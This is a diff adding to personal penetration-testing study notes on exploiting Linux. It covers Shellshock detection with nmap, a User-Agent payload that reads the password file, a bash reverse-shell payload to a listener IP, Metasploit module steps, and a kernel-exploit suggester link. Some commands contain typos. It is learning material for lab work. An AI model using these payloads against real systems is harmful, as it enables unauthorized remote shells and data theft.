@@ -175,3 +175,25 @@ that is a part of the local administrators group on the Windows target system
 ![[Frequently Exploited Linux Services.png]]
 
 ### Exploiting Linux Vulnerabilities
+
+###### Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
+- `nmap -sV 10.12.23.2 --script=http-shellshock --script-args "http-shellshock.uri=/urlname.cgi"`
+- open burp and send the request to repeater. add the below in User-Agent 
+	`() { :; }; echo; echo; /bin/bash -c 'cat /etc/password` -- to check if attack is possible
+	`() { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'` and open `nv -nlvp 9001`
+- Using msfconsole
+	 use exploit/multi/http/apache_mod_cgi_bash_env_exec
+	 set RHOST
+	 set TARGETURI /cgipath.cgi
+	 exploit
+
+###### Exploiting SAMBA
+- it same as [[Assessment Methodologies#SMB(Server Message Block)]] smb 
+
+### Linux Privilege Escalation
+
+###### Linux Kernel Exploits
+- GitHub: https://github.com/mzet-/linux-exploit-suggester -- this will enum all the known vulnerability within this particular version of Linux.
+
+###### Exploiting Misconfigured Cron Jobs
+- 
